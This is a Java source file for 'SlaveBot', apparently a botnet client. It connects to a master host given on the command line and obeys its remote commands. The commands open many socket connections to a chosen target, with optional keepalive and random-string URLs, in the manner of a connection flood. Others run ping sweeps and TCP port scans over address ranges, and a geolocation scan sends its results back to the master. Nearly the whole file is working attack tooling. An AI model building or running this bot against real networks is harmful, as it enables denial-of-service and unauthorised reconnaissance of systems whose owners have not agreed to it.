import java.io.*;
import java.net.*;
import java.util.*;
import java.util.ArrayList;
import java.lang.*;
import java.util.Iterator;
import java.util.List;
import java.io.*;
import java.util.Random;
import java.net.*;


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//Main
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
public class SlaveBot {
	public static void main(String args[]) throws IOException{

		if(args.length == 4 &&
				args[0].equals("-h") &&
				args[2].equals("-p") && 
				Integer.parseInt(args[3]) > 0 && Integer.parseInt(args[3]) < 65536){

			//user info
			InetAddress SIP = InetAddress.getLocalHost();
			System.out.println("IP of my system is := "+SIP.getHostAddress());
			System.out.println("My Host Name is    := "+SIP.getHostName());
			System.out.println("");

			String masterIPOrHostName = args[1];
			int masterPort = Integer.parseInt(args[3]);
			Socket socket = new Socket(masterIPOrHostName, masterPort);
			BufferedReader bfrFromMaster = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			System.out.println("connected to Master: "+masterIPOrHostName + " at Port: " + masterPort );
			System.out.println("Listning for commands...");
			System.out.println("");
			// Always listen from master for commands
			while(true){
				String cmdFromMaster = bfrFromMaster.readLine();
				SlaveThread salveThread = new SlaveThread(socket, cmdFromMaster);
				salveThread.start();
			}//while
		}//if
		else{
		System.out.println("Arguments missing,command line format is: java SlaveBot -h <Master-IP> -p <port>");
            	System.exit(-1);
		}//else
	}//main
}//class SB

class connectedSlaveList {
	public static List<Socket> socketList = Collections.synchronizedList(new LinkedList<>());
	public static List<String> ipOrHostList = Collections.synchronizedList(new LinkedList<>());
	public static List<Integer> portList = Collections.synchronizedList(new LinkedList<>());
	connectedSlaveList() {}
}// Class slave list

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//Slave Thread class
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

class SlaveThread extends Thread{

	private Socket slaveSocket;
	private String cmdFromMaster;
	private String[] cmd;
	private String targetIPorHost;
	private int targetPort;
	private int numConnection;

	SlaveThread(Socket socket, String cmdFromMaster){
		this.cmdFromMaster = cmdFromMaster;
		slaveSocket = socket;
	}//slave threadd

	public void run(){
		cmd = cmdFromMaster.split(" ");
		switch (cmd[0]) {
		case "connect":	connect(cmd); break;
		case "disconnect":disconnect(cmd);break;
		case "ipscan": Thread slaveIpscan = new SlaveIpScanThread(slaveSocket, cmdFromMaster);slaveIpscan.start();break;
		case "tcpportscan":Thread slaveportscan = new SlavePortScanThread(slaveSocket, cmdFromMaster);slaveportscan.start();break;
		case "geoipscan" :Thread slavegeoipscan = new SlaveGeoIpScanThread(slaveSocket, cmdFromMaster);slavegeoipscan.start();break;
		case "Exit":exit(cmd);break;
		default:break;
		}//case

	}//run


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//Connect
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	public void connect(String[] cmd) {
		targetIPorHost = cmd[1];
		targetPort = Integer.parseInt(cmd[2]);
		numConnection = Integer.parseInt(cmd[3]);
		
		for(int i = 0; i < numConnection; i++){
			synchronized(connectedSlaveList.socketList){
				try{
					Socket socket = new Socket(targetIPorHost, targetPort);
					connectedSlaveList.socketList.add(socket);
					System.out.println("Connected to: " + targetIPorHost + " at port: " + targetPort);
					if(cmdFromMaster.contains("keepalive")){
						socket.setKeepAlive(true);
						if(socket.getKeepAlive() == true){
							System.out.println("KeepAlive Avtive");
						}//if
					}//if keep alive

					else if(cmdFromMaster.contains("url=")){
						
					String randomString = new RandomString((new Random()).nextInt(10)+1).nextString();//random string
						String urlString = "";

						if(targetIPorHost.startsWith("http://") && cmdFromMaster.contains("/#q=")){
							urlString = targetIPorHost + "/" + cmd[4].substring(4) + randomString;
						}//if

						else if(cmdFromMaster.contains("/#q=")){
							urlString = "http://" + targetIPorHost + cmd[4].substring(4) + randomString;
						}//ele if

						else if(cmd[4].substring(4).startsWith("/")){
							urlString = "http://" + targetIPorHost + cmd[4].substring(4) + "/#q=" + randomString;
						}//else if
						else if(cmdFromMaster.contains("/") == false){
						urlString = "http://" + targetIPorHost + "/" + cmd[4].substring(4) + "/#q=" + randomString;
						}//elseif
						System.out.println(urlString);
					}// else if contains url

				}//try
					catch (UnknownHostException e){					
					System.exit(-1);
					}//catch

					catch (IOException e){
					e.printStackTrace();
					System.exit(-1);					
					}//catch
			}//wholesync
			synchronized(connectedSlaveList.ipOrHostList){
				connectedSlaveList.ipOrHostList.add(targetIPorHost);
			}//sync
			synchronized(connectedSlaveList.portList){
				connectedSlaveList.portList.add(targetPort);
			}//sync
		}//for
	}// connect



//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//Disonnect
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	public void disconnect(String[] cmd) {
		boolean isDisconnected = false;
		targetIPorHost = cmd[1];
		if(cmd[2].equals("all")){
			for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
				if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost)){
					isDisconnected = true;
					synchronized(connectedSlaveList.socketList){
						try{
							connectedSlaveList.socketList.get(i).close();
							connectedSlaveList.socketList.remove(i);
							System.out.println("disconnect " + targetIPorHost);
						}//try
							catch (IOException e){
							e.printStackTrace();
							System.exit(-1);
						}//catch
					}//list sync
					synchronized(connectedSlaveList.ipOrHostList){
						connectedSlaveList.ipOrHostList.remove(i);
					}//sync
					synchronized(connectedSlaveList.portList){
						connectedSlaveList.portList.remove(i);
					}//sync
				}//if
				i--;
			}//for
		}//if all
		else{

			targetPort = Integer.parseInt(cmd[2]);
			for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
				if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost) && 
						connectedSlaveList.portList.get(i).equals(targetPort)){
					isDisconnected = true;
					synchronized(connectedSlaveList.socketList){
						try{
							connectedSlaveList.socketList.get(i).close();
							connectedSlaveList.socketList.remove(i);

						}//try
							catch (IOException e){
							e.printStackTrace();
							System.exit(-1);
						}//catch
					}//list sync
					synchronized(connectedSlaveList.ipOrHostList){
						connectedSlaveList.ipOrHostList.remove(i);
					}//sync
					synchronized(connectedSlaveList.portList){
						connectedSlaveList.portList.remove(i);
						System.out.println("Disconnect complete");
					}//sync
				}//if
				i--;

			}//for
		}//else(not all)

		if(isDisconnected == false){
			//System.out.println(targetIPorHost + "not connnected");
		}//if

	}//Disconnect

	public void exit(String[] cmd) {
		System.out.println("Disconnect complete");
		System.exit(-1);
	}//exit

}// t

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//random string
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
class RandomString {
	private static final char[] symbols;
	static{
		StringBuilder tmp = new StringBuilder();
		for(char ch = '0'; ch <= '9'; ++ch)
			tmp.append(ch);
		for(char ch = 'a'; ch <= 'z'; ++ch)
			tmp.append(ch);
		symbols = tmp.toString().toCharArray();
	}//stat
	private final Random random = new Random();
	private final char[] buf;
	public RandomString(int length){
		if (length < 1)
			throw new IllegalArgumentException("length < 1: " + length);
		buf = new char[length];
	}//randstr
	public String nextString() {
		for (int idx = 0; idx < buf.length; ++idx)
			buf[idx] = symbols[random.nextInt(symbols.length)];
		return new String(buf);
	}//next string

}//Class Randomstring

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//IP Scan
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
class SlaveIpScanThread extends Thread{
	String input;
	Socket slaveSocket;

	SlaveIpScanThread(Socket slaveSocket, String cmdFromMaster){
		input = cmdFromMaster;
		this.slaveSocket = slaveSocket;
	}//slavescant

	public void run(){

			System.out.println(" ");
			System.out.println("Scanning IP...");
		String[] cmd = input.split("\\s+");
		try{
			ArrayList<String> testIPList = new ArrayList<String>();
			OutputStream outPutStrm = slaveSocket.getOutputStream();
			PrintWriter printW = new PrintWriter(outPutStrm, true);
			String first_ip	= cmd[1];
			String last_ip	= cmd[2];
			long firstip = SlaveIpScanThread.toLong(first_ip);
			long lastip = SlaveIpScanThread.toLong(last_ip);
			for(long i = firstip; i <= lastip; i++)
			{
				String testIp = SlaveIpScanThread.tostring(i);
				testIPList.add(testIp);

			}//for

			String printIpList = "";
			for(String allIp : testIPList){
				
				String osName = System.getProperties().getProperty("os.name");
				Process process = null;
				if(osName.startsWith("Windows")){
					process = Runtime.getRuntime().exec("ping -n 1 -w 1 " + allIp);
				}//if windows
				else {
					process = Runtime.getRuntime().exec("ping -c 1 -W 1 " + allIp);
				}//else linux/osx
				//if(osName.contains("OS") || osName.startsWith("Linux"))

				InputStreamReader r = new InputStreamReader(process.getInputStream());
				LineNumberReader returnData = new LineNumberReader(r);

				String returnMsg = "";
				String line = "";
				while((line = returnData.readLine()) != null){
					returnMsg += line;
				}//while
				
				if(returnMsg.indexOf("100% packet loss") == -1 && returnMsg.indexOf("100.0% packet loss") == -1
					&& returnMsg.indexOf("100% loss") == -1 ){
					System.out.println("IP: "+allIp +" Status: true");
					printIpList += allIp + ",";
				}//ifnot100%loss
				else {System.out.println("IP: "+allIp +" Status: false");}//else

			}//for
			int strLength = printIpList.length();

			if(strLength != 0){
				printIpList = printIpList.substring(0, strLength - 1);
			}//if strlen
			System.out.println(" ");
			System.out.println("final port list is: " + printIpList);
			System.out.println("Scan complete");
			System.out.println(" ");
			printIpList += "\r";
			printW.write(printIpList);
			printW.flush();

		}//try ends
		catch (UnknownHostException e){}//catch
		catch (IOException e){}//catch
	}//run

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//tolong
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	public static long toLong(String ipAddress) {
		if (ipAddress == null || ipAddress.isEmpty()) {
			throw new IllegalArgumentException("ip address cannot be null or empty");
		}//if
		String[] octets = ipAddress.split(java.util.regex.Pattern.quote("."));
		if (octets.length != 4) {
			throw new IllegalArgumentException("invalid ip address");
		}//if
		long ip = 0;
		for (int i = 3; i >= 0; i--) {
			long octet = Long.parseLong(octets[3 - i]);
			if (octet > 255 || octet < 0) {
				throw new IllegalArgumentException("invalid ip address");
			}//if
			ip |= octet << (i * 8);
		}//for
		return ip;
	}//tolong
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//tostring
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	public static String tostring(long ip) {
		// if ip is bigger than 255.255.255.255 or smaller than 0.0.0.0
		if (ip > 4294967295l || ip < 0) {
			throw new IllegalArgumentException("invalid ip");
		}//if
		StringBuilder ipAddress = new StringBuilder();
		for (int i = 3; i >= 0; i--) {
			int shift = i * 8;
			ipAddress.append((ip & (0xff << shift)) >> shift);
			if (i > 0) {
				ipAddress.append(".");
			}//if
		}//for
		return ipAddress.toString();
	}//tostring

}//thread

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//TCP Port SCAN
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

class SlavePortScanThread extends Thread{
	String sendtoMaster;
	Socket slaveSocket;
	SlavePortScanThread(Socket slaveSocket, String cmdFromMaster){
		sendtoMaster = cmdFromMaster;
		this.slaveSocket = slaveSocket;		
	}//thread

	public void run(){
		String[] cmd = sendtoMaster.split(" ");
		System.out.println(" ");
		System.out.println("TCP PORT Scanning...");
		//try{
		//InetAddress address = InetAddress.getByName(cmd[1]);
		String address = cmd[1];
		int low = Integer.parseInt(cmd[2]);
		int high = Integer.parseInt(cmd[3]);

		String portList = "";

		try{

			OutputStream outputToMaster = slaveSocket.getOutputStream();
			PrintWriter printToMaster = new PrintWriter(outputToMaster, true);

			for(int j = low; j <= high; j++){
				try{

					Socket testSocket = new Socket();
					testSocket.connect(new InetSocketAddress(address, j), 500);
					System.out.println("Port Number: "+j+" status: True");
					testSocket.close();
					portList += Integer.toString(j) + ",";
				}//try
				catch (Exception e){
					System.out.println("Port Number: "+j+" Status: Flase");
				}//catch
			}//for

			int listLength = portList.length();
			if(listLength != 0){
				portList = portList.substring(0, listLength - 1);
			}//if
			else{System.out.println("0 Detected ");	}
			System.out.println("final port list is: " + portList);
			System.out.println("Scan Complete");
			System.out.println("");	
			portList += "\r";
			printToMaster.write(portList);
			//System.out.println(portList);
			printToMaster.flush();
		}//try
			catch (IOException e){}//catch

	}//run

}//port scan thread

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//geoipscanScan
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
class SlaveGeoIpScanThread extends Thread{
	String input;
	Socket slaveSocket;
	SlaveGeoIpScanThread(Socket slaveSocket, String cmdFromMaster){
		input = cmdFromMaster;
		this.slaveSocket = slaveSocket;	
	}//thread

	public void run(){
		String[] command = input.split(" ");
		int startIndex = command[1].lastIndexOf(".");
		int endIndex = command[2].lastIndexOf(".");
		String fixedIp = command[1].substring(0, startIndex + 1);
		int start = Integer.parseInt(command[1].substring(startIndex + 1));
		int end = Integer.parseInt(command[2].substring(endIndex + 1));

		try{				
			//StringBuilder geoLocation = new StringBuilder();
			String geoLocation = "";

			OutputStream outPutStrm = slaveSocket.getOutputStream();
			PrintWriter printW = new PrintWriter(outPutStrm, true);
			

			ArrayList<String> ping = new ArrayList<String>();
			System.out.println(" ");
			System.out.println("Geo Location IP Scan started...");
			for(int i = start; i <= end; i++){
				String pingIp = fixedIp + Integer.toString(i);
				String osName = System.getProperties().getProperty("os.name");
				Process process = null;
				
				if(osName.startsWith("Windows")){
					process = Runtime.getRuntime().exec("ping -n 1 -w 1 " + pingIp);
					// System.out.println("windows system");
				}//windows
				else{process = Runtime.getRuntime().exec("ping -c 1 -W 1 " + pingIp);
					
				}//linux or osx

				InputStreamReader r = new InputStreamReader(process.getInputStream());
				LineNumberReader returnData = new LineNumberReader(r);

				String returnMsg = "";
				String line = "";
				while((line = returnData.readLine()) != null){
					returnMsg += line;
				}//while
				if(returnMsg.indexOf("100% packet loss") == -1 && returnMsg.indexOf("100.0% packet loss") == -1
					&& returnMsg.indexOf("100% loss") == -1 ){
					ping.add(pingIp);
				}//ifnot loss
			}// for


			// querry location details from database
			for(String address : ping){

				String geoTest = "http://freegeoip.net/xml/" + address;
				//System.out.println(geoTest);
				URL geoWebsite = new URL(geoTest);
				BufferedReader in = new BufferedReader(new InputStreamReader(geoWebsite.openStream()));
				String inputLine = "";

				geoLocation += address;
				while((inputLine = in.readLine()) != null){
					if(inputLine.contains("CountryName")){
						int findIp = inputLine.lastIndexOf("<");
						String countryInfo = inputLine.substring(0, findIp);
						geoLocation += countryInfo;

					}//if
					if(inputLine.contains("City")){
						int city = inputLine.lastIndexOf("<");
						String cityInfo = inputLine.substring(0, city);

						geoLocation += cityInfo;
						geoLocation += ";";
					}//if
				}//while
				in.close();					
			}
			if(geoLocation.length() != 0){

				geoLocation = geoLocation.substring(0, geoLocation.length() - 1);

			}else {System.out.println("0 detected");}
			System.out.println("Scan Complete");
			//System.out.println("details: " + geoLocation);
			System.out.println("");
			geoLocation += "\r";
			printW.println(geoLocation);
		}//try
			catch(Exception e){}
	}//run

}//grothread
